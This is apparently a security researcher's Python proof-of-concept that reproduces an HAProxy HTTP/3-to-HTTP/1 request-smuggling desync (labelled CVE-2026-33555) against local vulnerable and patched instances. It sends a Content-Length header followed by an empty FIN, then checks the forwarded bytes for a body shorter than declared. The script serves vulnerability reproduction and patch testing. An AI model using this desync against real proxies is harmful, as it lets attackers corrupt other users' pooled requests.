"""Reproduce CVE-2026-33555 (HAProxy H3->H1 standalone-FIN desync) as the positive
control. Send HEADERS(CL:N, end_stream=False) then a STANDALONE FIN (empty QUIC
STREAM frame + FIN, no body). A vulnerable edge marks the request complete and
forwards CL:N with ZERO body to the origin; the next pooled request's first N bytes
are eaten. We read the tap (edge->origin bytes) to see the CL:N-with-no-body forward,
then fire a victim request and check the origin's framing. Vuln (4434) vs patched
(4433). Negative control: a well-formed request forwards CL matching the body."""
import asyncio, os, ssl, sys, time
sys.path.insert(0, "/home/j4kuuu/Desktop/tools/QuicDrawH3/src")
from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.quic.configuration import QuicConfiguration

TAP = "logs/tap_eo.jsonl"
ECHO = "logs/echo_vuln.jsonl"
CRLF = b"\r\n"


def size(p):
    try: return os.path.getsize(p)
    except OSError: return 0


def tap_delta(off):
    try:
        with open(TAP, "rb") as f:
            f.seek(off); return f.read()
    except OSError:
        return b""


async def send(port, ops):
    """ops: list of ('headers', fields, end_stream) or ('fin',) or ('data', bytes, end)."""
    cfg = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    cfg.verify_mode = ssl.CERT_NONE
    async with connect("127.0.0.1", port, configuration=cfg) as client:
        quic = client._quic
        http = H3Connection(quic)
        sid = quic.get_next_available_stream_id()
        for op in ops:
            if op[0] == "headers":
                http.send_headers(stream_id=sid, headers=op[1], end_stream=op[2])
            elif op[0] == "fin":
                quic.send_stream_data(sid, b"", end_stream=True)   # STANDALONE FIN
            elif op[0] == "data":
                http.send_data(stream_id=sid, data=op[1], end_stream=op[2])
            client.transmit()
            await asyncio.sleep(0.15)
        await asyncio.sleep(0.3)


def H(path, cl=None, method=b"POST"):
    h = [(b":method", method), (b":scheme", b"https"), (b":authority", b"lab"), (b":path", path)]
    if cl is not None:
        h.append((b"content-length", str(cl).encode()))
    return h


def probe(label, port, ops):
    off = size(TAP)
    try:
        asyncio.new_event_loop().run_until_complete(send(port, ops))
    except Exception as e:
        pass
    time.sleep(0.4)
    fwd = tap_delta(off)
    # what did HAProxy forward to origin? show framing + body length
    head, _, body = fwd.partition(CRLF + CRLF)
    cl_line = [l for l in head.split(CRLF) if l.lower().startswith(b"content-length")]
    print(f"\n### {label}  (port {port})")
    print(f"  edge->origin forwarded {len(fwd)}B")
    print(f"  request-line : {fwd.split(CRLF,1)[0][:60]!r}")
    print(f"  content-length: {cl_line}")
    print(f"  body forwarded: {len(body)} bytes {body[:40]!r}")
    if cl_line:
        declared = int(cl_line[0].split(b":", 1)[1].strip() or b"0")
        if declared > 0 and len(body) < declared:
            print(f"  *** DESYNC: declared CL={declared} but only {len(body)} body bytes forwarded ***")


print("=" * 60, "\nNEGATIVE CONTROL: well-formed POST CL=4 + full body")
probe("wellformed vuln", 4434, [("headers", H(b"/ctl", cl=4), False), ("data", b"AAAA", True)])

print("\n" + "=" * 60, "\nCVE-2026-33555: HEADERS(CL=10) + STANDALONE FIN (no body)")
probe("standalone-FIN vuln (4434)", 4434, [("headers", H(b"/evil", cl=10), False), ("fin",)])
probe("standalone-FIN PATCHED (4433)", 4433, [("headers", H(b"/evil", cl=10), False), ("fin",)])
